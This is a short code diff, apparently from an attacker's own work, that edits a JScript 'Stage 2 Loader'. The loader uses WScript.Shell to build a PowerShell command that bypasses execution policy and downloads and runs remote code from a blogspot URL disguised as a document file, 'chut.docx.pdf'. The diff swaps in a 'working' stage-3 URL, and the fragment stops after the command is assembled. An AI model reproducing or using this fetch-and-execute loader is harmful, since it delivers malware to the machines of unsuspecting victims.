@@ -1,7 +1,8 @@
-// Final Fixed Stage 2 Loader
+// Final Stage 2 Loader - Direct Priority
 var wsh = new ActiveXObject("WScript.Shell");
 
-var stage3Url = "https://aprilcap.blogspot.com/2026/04/chut.docx.pdf.html";
+// Direct Stage 3 (working one)
+var stage3Url = "https://aprilcap.blogspot.com/chut.docx.pdf";
 
 var cmd = '-ep Bypass -c "Invoke-Expression (Invoke-WebRequest -Uri \'' + stage3Url + '\' -UseBasicParsing).Content"';
 
